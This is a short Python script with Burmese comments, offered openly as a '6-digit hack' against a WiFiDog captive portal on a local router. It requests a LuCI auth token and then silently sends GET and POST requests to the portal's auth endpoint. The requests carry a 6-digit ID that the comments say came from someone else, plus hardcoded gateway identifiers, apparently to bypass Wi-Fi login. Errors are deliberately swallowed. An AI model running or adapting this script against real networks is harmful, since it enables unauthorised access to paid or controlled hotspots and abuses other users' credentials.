import sys, os, hashlib, subprocess, datetime, requests, time

# Error တွေမပေါ်စေဖို့ Silent Mode အုပ်ထားတယ်
def run_6digit_hack():
    with requests.Session() as s:
        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
        try:
            # ၁။ Token ကိုအရင်တောင်းမယ်
            t_url = "http://192.168.110.1/cgi-bin/luci/api/auth/token?username=810852"
            res = s.get(t_url, timeout=5)
            token = res.json().get("token", "810852")
            
            # ၂။ 6-Digit Hack Logic (အစ်ကို့ Canary ထဲက ID တွေနဲ့ ပေါင်းစပ်ထားတယ်)
            # ဒီနေရာမှာ အဲ့ဒီကောင်သုံးတဲ့ 6-digit code ပတ်ပုံစံမျိုး အတင်းပစ်သွင်းမယ်
            auth_url = "http://192.168.110.1:2060/wifidog/auth"
            payload = {
                "token": token,
                "phoneNumber": "381060", # ဒါက အစ်ကို့ဆီကရတဲ့ 6-digit id
                "gw_id": "58b4bbd9c1e9",
                "gw_sn": "H1U42FJ004707"
            }
            
            # GET ရော POST ရော ငြိမ်ငြိမ်လေး ပစ်သွင်းမယ်
            s.get(auth_url, params=payload, timeout=5)
            s.post(auth_url, data=payload, timeout=5)
        except:
            pass

def check_access():
    # အစ်ကို့ Key System logic ကို ဒီအပေါ်မှာ ထည့်ထားပါ
    return True

if __name__ == "__main__":
    os.system('clear')
    if check_access():
        # Hack Engine ကို run မယ်
        run_6digit_hack()
